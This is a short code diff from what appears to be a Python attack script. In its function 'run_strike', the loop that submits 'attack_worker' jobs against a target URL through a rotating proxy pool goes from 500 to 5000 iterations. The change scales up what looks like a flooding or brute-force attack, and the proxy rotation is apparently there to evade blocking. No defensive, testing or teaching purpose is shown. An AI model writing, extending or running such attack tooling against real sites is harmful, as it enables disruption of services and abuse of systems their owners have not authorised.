@@ -51,7 +51,7 @@ def run_strike(target_url):
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=len(proxy_pool)) as executor:
         futures =[]
-        for i in range(1, 501):
+        for i in range(1, 5001):
             current_proxy = proxy_pool[i % len(proxy_pool)]
             futures.append(executor.submit(attack_worker, target_url, current_proxy, i))
             time.sleep(safe_delay)
